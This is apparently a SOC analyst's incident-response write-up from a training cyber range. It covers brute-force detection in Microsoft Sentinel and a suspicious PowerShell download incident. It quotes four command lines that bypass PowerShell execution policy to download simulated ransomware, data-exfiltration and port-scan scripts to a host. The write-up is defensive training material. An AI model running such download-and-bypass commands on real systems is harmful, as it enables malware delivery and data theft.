
## Incident Response: PowerShell Suspicious Web Request

### **Preparation**

- Roles and responsibilities for incident response are documented within the SOC team.

- Microsoft Defender for Endpoint (MDE) and Microsoft Sentinel are deployed and configured for endpoint monitoring and alerting.

- Staff are trained on incident detection, investigation, and containment procedures.

- Network Security Groups (NSGs) are in place but will be enhanced post-incident.


### **Detection and Analysis**

- An alert was defined to trigger for repeated brute force login attempts on the virtual machine `win-vm-mde` within a certain time period. In this case, it was 10 failed login attempts within 5 days.

- The alert corresponded to failed logon events from four distinct IP addresses:


![image](https://github.com/user-attachments/assets/cd167a51-4ae6-4c62-90d9-1b7a9d9f37e2)


<img width="1415" alt="Screenshot 2025-06-12 195209" src="https://github.com/user-attachments/assets/f6696223-b551-4c6c-b93d-456bf0afefdb" />





- Login attempts were made using IP addresses from Poland, Russia, Ukraine and South Africa. It is not confirmed if the threat actors were physically located there or if a VPN, proxy server, or botnet was used. The IP address `193.37.69.105` from Russia is the most recent activity that appeared on our SIEM and it may have affected a Log Analytics Workspace Incidents diagram. This will be revisited shortly.

- A rule was created to monitor any suspiciously repeated login failure attempts. Specifically, the rule was to detect at least 10 failed login attempts within a 5-day window. The 5-day window was chosen due to the enormous amount of endpoints in the shared cloud environment. In such environments, brute force login failures may be distributed over time and across many devices. A longer detection window will help aggregate repeated failed login attempts that might be spread out, which will reduce alert fatigue. 

![image](https://github.com/user-attachments/assets/243377f6-cea8-4d11-9c61-d7cc72171268)

- The appropriate Tactics, Techniques and Procedures (TTPs) from the MITRE ATT&CK Framework were selected for this detection rule.
  - Credential Access (T1110)
    - Brute Force (T1110)
      - Password Guessing (T1110.001)
      - Password Cracking (T1110.002)
  - Discovery (T1087)
    - Account Discovery (T1087)
      - Local Account Discovery (T1087.001)
      - 
<img width="547" alt="Pasted image 20250612200020" src="https://github.com/user-attachments/assets/c55cb257-1e0a-4dbc-b9d2-8e077846014b" />

<img width="550" alt="Pasted image 20250612200103" src="https://github.com/user-attachments/assets/fc28d953-0db0-45d8-8703-e77b86ab37a5" />

<img width="550" alt="Pasted image 20250612200132" src="https://github.com/user-attachments/assets/efa3ff45-9e78-472f-ba24-eeb4ced3c507" />

<img width="412" alt="Pasted image 20250612200149" src="https://github.com/user-attachments/assets/976cd3f4-cba0-4e28-9748-356c771a1453" />

![image](https://github.com/user-attachments/assets/61e1553f-5790-4b01-aa4d-ef605a3a8613)

Microsoft Sentinel will execute the query to log any accounts that failed login attempts on the `win-vm-mde` host machine. In the following Incidents diagram, two entities will be displayed: the target device `(DeviceName)` under attack, and the remote IP addresses `(RemoteIP)` attempting the login.


![image](https://github.com/user-attachments/assets/948e20eb-be81-4d74-988e-39b82bcd0f32)

After the rule was created, we see two entities: the host machine `win-vm-mde` and the IP address `193.37.69.105`. In our initial findings, there were 4 total IP addresses including this one that reportedly originated from Russia. They all occurred within the 5-day window and yet did not appear as separate entities. 

![image](https://github.com/user-attachments/assets/ec4ad430-8aa5-4ed6-b2bf-04a958ead84d)

<img width="1521" alt="Screenshot 2025-06-12 203510" src="https://github.com/user-attachments/assets/ddf32244-2289-4812-86a3-2c030fdaa875" />

<img width="1507" alt="Screenshot 2025-06-12 203844" src="https://github.com/user-attachments/assets/8bcf4bfb-9856-401d-aebd-9c92dc8dee5a" />


![image](https://github.com/user-attachments/assets/a7b19096-eba4-4c75-b4a7-605c23cd2527)


![image](https://github.com/user-attachments/assets/8c279499-9b01-4a37-83e8-18bef1064964)


Upon investigating the triggered incident `Alert PowerShell Suspicious Web Request Rule`, it was discovered that the following PowerShell commands were run on machine `win-vm-mde`

The `Alert PowerShell Suspicious Web Request Rule` incident was triggered by 1 user, but downloaded 4 different scripts with 4 different commands.

win-vm-mde
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/exfiltratedata.ps1 -OutFile C:\programdata\exfiltratedata.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1

The folowing scripts contained
portscan.ps1
eicar.ps1
exfiltratedata.ps1
pwncrypt.ps1

![image](https://github.com/user-attachments/assets/1a5b9297-7f69-46af-84ac-733aee1430f4)


The user `ylavnu` was contacted and asked what they were doing on their PC around the time of the logs being generated and they said they tried to install a free piece of software, which resulted in a black screen for a few seconds, and then 'nothing happened' afterwards. 


At this point we know the scripts were downloaded but didn't know if they were executed. So we decided to run another query.



![image](https://github.com/user-attachments/assets/4adb0e5b-62cd-473a-95e0-616095f5e3f3)

It was determined that the downloaded scripts actually did run. The scripts were then passed off to the malware reverse engineering team. Here were the short descriptions for each script:

portscan.ps1: Scans a specified range of IP addresses for open ports from a list of common ports and logs the results.

eicar.ps1: Creates an EICAR test file, which tests antivirus solutions and logs the process.

exfiltratedata.ps1: Generates fake employee data, compresses it into a ZIP file, and uploads it to an Azure Blob Storage container, simulating data exfiltration.

pwncrypt.ps1: Encrypts files in a selected user's desktop folder, simulating ransomware activity and creates a ransom note with decryption instructions.





### **Containment Actions**

- The affected VM was isolated using Microsoft Defender for Endpoint (MDE).

<img width="1547" alt="Screenshot 2025-06-11 210357" src="https://github.com/user-attachments/assets/973f0fd2-e37c-416a-bffd-bc3981ccf6fa" />

- A full antimalware scan was performed on the VM through MDE.

- After the machine was returned with no trace of malware, it was removed from isolation.


### **Closure**

The incident response team has reviewed and confirmed the resolution of the event. All containment and remediation steps have been completed, and relevant findings have been documented. This incident has been classified as a `True Positive – Suspicious Activity`. A brute force attack was detected targeting the `win-vm-mde` host. However, all attempts were unsuccessful, and no unauthorised access was achieved.


Had the affected user go through extra rounds of cybersecurity awareness training and upgraded the training package from KnowBe4 and increased frequency. Also implemented a policy that restricts the use of PowerShell for non-essential users. 





